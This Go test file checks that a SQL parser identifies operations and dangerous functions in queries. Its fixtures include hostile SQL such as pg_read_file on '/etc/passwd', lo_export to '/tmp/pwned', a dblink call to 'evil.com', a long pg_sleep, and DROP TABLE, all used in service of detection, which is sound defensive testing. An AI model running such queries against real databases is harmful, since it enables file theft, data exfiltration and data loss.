package main

import (
	"fmt"
	"testing"
)

func TestParserAST(t *testing.T) {
	tests := []struct {
		name      string
		query     string
		wantOp    string
		wantAST   bool
		wantFuncs []string
	}{
		{"pg_sleep", "SELECT pg_sleep(999)", "SELECT", true, []string{"pg_sleep"}},
		{"lo_export", "SELECT lo_export(1234, '/tmp/pwned')", "SELECT", true, []string{"lo_export"}},
		{"CTE", "WITH leaked AS (SELECT * FROM secret_table) SELECT * FROM leaked", "SELECT", true, nil},
		{"dblink", "SELECT * FROM dblink('host=evil.com', 'SELECT 1') AS t(id int)", "SELECT", true, []string{"dblink"}},
		{"normal", "SELECT id, name FROM public.feedback WHERE id > 5", "SELECT", true, nil},
		{"DROP", "DROP TABLE public.feedback", "DROP", true, nil},
		{"pg_read_file", "SELECT pg_read_file('/etc/passwd')", "SELECT", true, []string{"pg_read_file"}},
		{"schema_qual", "SELECT pg_catalog.pg_sleep(10)", "SELECT", true, []string{"pg_catalog.pg_sleep", "pg_sleep"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			fmt.Printf("  [%s] op=%s ast=%v tables=%v funcs=%v\n", tt.name, parsed.Operation, parsed.UsedAST, parsed.Tables, parsed.Functions)
			if parsed.Operation != tt.wantOp {
				t.Errorf("operation: got %s, want %s", parsed.Operation, tt.wantOp)
			}
			if parsed.UsedAST != tt.wantAST {
				t.Errorf("usedAST: got %v, want %v", parsed.UsedAST, tt.wantAST)
			}
			for _, wf := range tt.wantFuncs {
				found := false
				for _, f := range parsed.Functions {
					if f == wf {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %s not found in %v", wf, parsed.Functions)
				}
			}
		})
	}
}
